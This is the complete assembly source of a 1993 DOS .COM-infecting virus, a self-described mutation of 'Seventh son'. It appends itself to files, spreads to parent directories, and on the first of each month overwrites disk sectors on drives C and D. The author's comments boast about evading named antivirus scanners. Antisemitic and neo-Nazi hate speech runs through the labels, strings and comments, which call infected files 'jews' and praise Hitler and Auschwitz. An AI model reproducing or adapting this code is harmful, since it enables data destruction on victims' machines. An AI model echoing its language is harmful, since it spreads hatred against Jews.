; VirusName: Arbeit Macht Frei!
; Country  : Sweden
; Author   : The Unforgiven / Immortal Riot
; Date     : 01/10-1993
;
;
; This is a mutation of the Seventh son of a seventh son virus.
; Metal Militia mutated this one for the first issue of our
; magazine, (Insane Reality), but here comes my contribution..
;
; This is a non-owervriting .COM infector, the infected
; files will grow with 426 bytes. It's kinda big, of the
; reasons of "all" new routines included..
;
; The virus will check what day it is, and if it's the first
; any month, the virus will overwrite sectors on Drive C and D.
;
; The Fileattributes (Date/Time) will be saved, and
; restored after the virus has infected a file.
;
; I've also added a "Dot-Dot" routine, so the virus will
; not just infect the files in the current directory as
; the original one did. It don't got any encryption, but
; I ain't embarrased of showing my name  ...<smile>... 
;
; Scan v108 can't find this, neither can S&S Toolkit 6.54,
; F-Prot finds it, and TBScan thinks it's a Unknown virus.
;
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;	       	        ARBEIT MACHT FREI
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

FILELEN         equ     quit - start
MINTARGET       equ     1000		; 250*4 huh?..
MAXTARGET       equ     -(FILELEN+40h)	; FileLenght + writing in file

                org     100h

                .RADIX  16

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                  Dummy program (infected)
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
begin:          db      4Dh		; Virus-Marker
                jmp     start		; Jump to next procedure

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                  Begin of the virus
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
start:          call    start2		; Call next procedure
 		add	ax,dx		; Adding this line, and S&S
					; Toolkit's findviru bites the dust

start2:         pop     bp
                sub     bp,0103h

                lea     si,[bp+offset begbuf-4] ;restore begin of jew
                mov     di,0100h
                movsw
                movsw

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                xor     dl,dl                   ;clear the flag
                mov     ax,3301h
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                mov     dx,offset ni24 - 4      ;set new int24 vector
                add     dx,bp
                mov     ax,2524h
                int     21

                lea     dx,[bp+offset quit]      ;set new DTA adres
                mov     ah,1Ah
                int     21
                add     dx,1Eh
                mov     word ptr [bp+offset nameptr-4],dx

                lea     si,[bp+offset grandfather-4]  ;check youngest jew
                cmp     [si],0606h
                jne     verder

                lea     dx,[bp+offset sontxt-4]       ;Arbeit Jew!
                mov     ah,09h
                int     21

verder:         mov     ax,[si]			      ;Komme Hier!
                xchg    ah,al
                xor     al,al
                mov     [si],ax

                lea     dx,[bp+offset filename-4]     ;Find first Jew!
                xor     cx,cx
                mov     ah,4Eh
                int     21

infloop:        mov     dx,word ptr [bp+offset nameptr-4]
                call    infect

                mov     ah,4Fh                  ;find Next Jew!
                int     21
                jnc     infloop

                pop     ds                      ;restore int24 vector
                pop     dx
                mov     ax,2524h
                int     21

                pop     dx                      ;restore ctrl-break flag
                mov     ax,3301h
                int     21

                push    cs
                push    cs
                pop     ds
                pop     es
                mov     ax,0100h            ;put old start-adres on stack
                push    ax
                ret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;       Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
infect:         
		cld

                mov     ax,4300h                ;ask attributes
                int     21
                push    cx

                xor     cx,cx                   ;clear flags
                call    setattr
                jc      return1

                mov     ax,3D02h                ;Cut up the Jew!
                int     21
                jc      return1
                xchg    bx,ax

                mov     ax,5700h                ;get jew's date & time
                int     21
                push    cx
                push    dx

                mov     cx,4                    ;read begin of the jew
                lea     dx,[bp+offset begbuf-4]
                mov     ah,3fh
                int     21

                mov     al,byte ptr [bp+begbuf-4]  ;infected Jew?
                cmp     al,4Dh
                je      return2
                cmp     al,5Ah                  ;or a weird EXE
                je      return2

                call    endptr                  ;get jew-length	(cm)

                cmp     ax,MAXTARGET            ;check length of jew
                jnb     return2
                cmp     ax,MINTARGET
                jbe     return2

                push    ax
                mov     cx,FILELEN           ;write program to end of jew!
                lea     dx,[bp+offset start-4]
                mov     ah,40h
                int     21
                cmp     ax,cx                   ;are all bytes written?
                pop     ax
                jnz     return2

                sub     ax,4                    ;calculate new start-adres
                mov     word ptr [bp+newbeg-2],ax

                call    beginptr                ;write new begin of jew!
                mov     cx,4
                lea     dx,[bp+offset newbeg-4]
                mov     ah,40h
                int     21

                inc     byte ptr [si]           ;Jew 'Serial' Number..

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;			     'Dot-Dot'
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
		MOV	DX,OFFSET point_point   ; '..' 
		MOV	AH,3BH			;
		INT	21h			;

return2:        pop     dx                      ;restore jew date & time
                pop     cx
                mov     ax,5701h
                int     21

                mov     ah,3Eh                  ;close the jew!
                int     21

return1:       
		call	daycheck
	        pop     cx                      ;restore jew-attribute
		ret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;	        	DayChecker
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
daycheck:		 ;                                             
  	mov ah,2ah	 ; Check for day
 	int 21h		 ;                                              
 	cmp dl,01	 ; Check for the first any month
 	je  Hitler   	 ; Day=01=Heil Hitler!    
 	jmp Setattr	 ; Jump to 'Setattr'..

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;	       Play Around with Drive C a while
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
Hitler:   				; Did quite a good job..   
	cli				; Cuz NoOne escaped!                    
	mov	ah,2	 ; (C:)		; Kill ‚m all!            
	cwd				; Killing from 0         
	mov	cx,0100h		; Continue to 256
	int	026h			; No Rescue!
	jmp	Auschwitz        	; Travel by train

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;		Hitler has send your drive D to Auschwitz
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
Auschwitz: 				; There they're killed..
	MOV	AL,3	 ; (D:)		; Choose D-Drive
	MOV	CX,700			; Kill 700 of them!        
	MOV	DX,00			; Start with the first
	MOV	DS,[DI+99]		; Machine Gun..       
	MOV	BX,[DI+55]		; Tortue Chamber..
      	call	hitler			; Start it over!

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;		  Set Attributes (Date/Time)
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
setattr:           mov     dx,word ptr [bp+offset nameptr-4]
                   mov     ax,4301h
                   int     21
                   ret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;               Subroutines for file-pointer
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
beginptr:       mov     ax,4200h                ;go to begin of jew
                jmp     short ptrvrdr

endptr:         mov     ax,4202h                ;go to end of jew
ptrvrdr:        xor     cx,cx
                xor     dx,dx
                int     21
                ret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;               Interupt handler 24
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
ni24:           mov     al,03
                iret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;               Data
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
begbuf          db      0CDh,  20h, 0, 0
newbeg          db       4Dh, 0E9h, 0, 0
nameptr         dw      ?
sontxt          db      ' ARBEIT MACHT FREI! ',0Dh, 0Ah, '$';mutation name
		db	' The Unforgiven / Immortal Riot '  ;that's me!
	        db	' Sweden 01/10/93 '
grandfather     db      0
father          db      0
filename        db      '*.COM',0			  ; jew-Spec!
point_point	db	'..',0				  ; 'dot-dot'
quit: 

cseg            ends
                end     begin

; Greetings goes out to Raver, Metal Miltia, Scavenger
; to our mighty Hitler, and of-cuz all the Neo-Nazis!!
; Remember..Arbeit Macht Frei! / The Unforgiven /